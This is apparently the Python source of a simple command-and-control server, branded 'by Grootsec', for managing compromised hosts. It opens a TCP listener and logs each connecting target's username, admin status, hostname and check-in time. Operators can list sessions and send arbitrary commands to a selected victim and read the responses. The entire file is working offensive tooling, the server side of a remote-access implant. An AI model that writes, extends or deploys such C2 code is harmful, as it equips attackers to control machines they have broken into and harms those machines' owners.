import socket
import sys
import threading
from prettytable import PrettyTable
import time
from datetime import datetime

def banner():    
    print('·▄▄▄▄   ▄▄▄· ▄▄▄▄· ▄▄▄▄·  ▄▄▄·  ▄ .▄     ▄▄·2 ')
    print('██▪ ██ ▐█ ▀█ ▐█ ▀█▪▐█ ▀█▪▐█ ▀█ ██▪▐█    ▐█ ▌▪')
    print('▐█· ▐█▌▄█▀▀█ ▐█▀▀█▄▐█▀▀█▄▄█▀▀█ ██▀▐█    ██ ▄▄ by Grootsec')
    print('██. ██ ▐█ ▪▐▌██▄▪▐███▄▪▐█▐█ ▪▐▌██▌▐▀    ▐███▌')
    print('▀▀▀▀▀•  ▀  ▀ ·▀▀▀▀ ·▀▀▀▀  ▀  ▀ ▀▀▀ ·    ·▀▀▀ ')


def comm_in(targ_id):
    print('[*] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response

def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_val = 'Yes'
            elif username == 'root':
                admin_val= 'Yes'
            else:
                admin_val = 'No'
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'\n[+] Connection recevied from {remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            pass

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[*] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def target_comm(targ_id):
    while True:
        message = input('send message#> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()

            break
        if message == 'background' or message == 'bg':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                targ_id.close()
                break
            print(response)

if __name__ == '__main__':
    targets = []
    kill_flag = 0
    listener_counter = 0
    banner()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input('Enter command#> ')
            if command == 'listeners -g':
                host_ip = input('[*] Enter the IP to listen on: ')
                host_port = input('[*] Enter the port to listen on: ')
                listener_handler()
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1]  == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Check-in Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                        session_counter += 1
                    print(myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[-] Keyboard interrupt issued')
            kill_flag = 1
            sock.close()
            break         
     